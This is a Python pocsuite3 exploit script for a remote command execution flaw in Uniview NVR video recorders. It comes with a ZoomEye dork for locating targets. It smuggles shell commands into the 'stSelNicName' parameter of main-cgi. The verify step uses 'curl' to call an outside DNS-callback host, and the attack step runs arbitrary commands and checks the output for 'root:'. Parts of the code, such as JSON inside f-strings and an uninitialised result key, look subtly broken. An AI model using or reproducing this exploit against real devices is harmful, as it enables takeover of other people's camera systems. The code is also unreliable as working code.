#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import POCBase, register_poc, logger,CEye,random_str
# from pocsuite3.modules import DnsEcho
from urllib import parse
# from collections import OrderedDict
# from pocsuite3.lib.core.interpreter_option import OptString
import requests


class Exploit(POCBase):
    name = 'Uniview NVR设备全版本远程命令执行漏洞'
    appName = "Uniview NVR"
    vulDate = '2023-05-31'
    vulType = "Remote Code Execute"
    dork = {"zoomeye":"Uniview"}
    # OPTIONS = OrderedDict({"command": OptString('id', "自定义执行指令")})

    def _exploit(self, param=''):
        payload1 = f'/cgi-bin/main-cgi?json={"cmd":264,"status":1,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":";{param};"}'
        payload2 = f'/cgi-bin/main-cgi?json={"cmd":265,"szUserName":"","u32UserLoginHandle":-1}'
        url = parse.urljoin(self.url, payload1)
        res = requests.get(url)
        logger.debug(res.text)
        return res

    def _verify(self):
        result = {}
        dns_ran = random_str(6)
        dns_echo = CEye()
        gdns = dns_echo.build_request(value=dns_ran,type='dns')
        url,flag = gdns['url'],gdns['flag']
        param = f'curl {url}'
        res = self._exploit(param)
        if dns_echo.verify_request(flag,type='dns'):
            result['VerifyInfo'][param] = res
            result['VerifyInfo']["Url"] = self.url
            return self.parse_output(result)

    def _attack(self):
        result = {}

        param = self.get_option('command')
        res = self._exploit(param)
        if 'root:' in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
        return self.parse_output(result)


#

register_poc(Exploit)
# if __name__ == '__main__':
#     import os
#
#     os.environ.setdefault('http', 'socks5://127.0.0.1:7890')
#     os.environ.setdefault('http', 'socks5://127.0.0.1:7890')
#     exp = Exploit()
#     exp.set_option('url', '')
#     exp.set_option('command', 'id')
#     exp.execute(mode='attack')
